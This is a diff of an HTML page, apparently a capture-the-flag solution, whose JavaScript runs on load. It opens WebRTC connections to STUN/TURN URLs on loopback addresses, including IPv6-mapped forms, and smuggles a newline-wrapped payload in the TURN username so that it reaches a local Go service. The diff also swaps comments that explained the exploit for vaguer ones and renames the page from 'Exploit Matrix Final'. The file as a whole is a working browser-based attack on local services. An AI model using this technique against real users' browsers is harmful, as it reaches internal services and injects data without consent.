@@ -1,44 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Matrix Final</title>
+    <title>Same-Origin Matrix</title>
 </head>
 <body>
-    <h1>Processing network routes...</h1>
+    <h1>Talking to the locals...</h1>
     <script>
-        // The Go backend splits buffers up to a newline character.
-        // Prefixing with a newline drops any residual socket junk to line 1,
-        // leaving our target string perfectly clear on line 2.
         const payload = "\ngive me the flag bro\n";
 
-        function firePacket(targetUri) {
+        function sendLocalPacket(target) {
             try {
                 const pc = new RTCPeerConnection({
                     iceServers: [{
-                        urls: targetUri,
+                        urls: target,
                         username: payload,
                         credential: "x"
                     }]
                 });
                 pc.createDataChannel("trigger");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.createOffer().then(o => pc.setLocalDescription(o));
             } catch(e) {}
         }
 
-        // We wrap the loopback target inside the IPv6-mapped IPv4 structure [::ffff:127.0.0.1]
-        // This forces Firefox's IPv6-preferred stack to execute the raw binding test.
-        const vectors = [
-            "stun:[::ffff:127.0.0.1]:6767",
+        // Broad spectrum loopback array utilizing literal, mapped, and hex container interfaces
+        const locals = [
+            "turn:127.0.0.1:6767",
+            "stun:127.0.0.1:6767",
             "turn:[::ffff:127.0.0.1]:6767",
-            "stun:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767",
+            "stun:[::ffff:127.0.0.1]:6767",
             "turn:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767"
         ];
 
-        vectors.forEach((uri, i) => {
-            setTimeout(() => firePacket(uri), i * 100);
+        locals.forEach((uri, i) => {
+            setTimeout(() => sendLocalPacket(uri), i * 50);
         });
 
-        // Redirect within 1.5 seconds to exit headless Firefox and release the Go server mutex
+        // Let Firefox gracefully broadcast before closing the context
         setTimeout(() => {
             window.location.href = "about:blank";
         }, 1500);
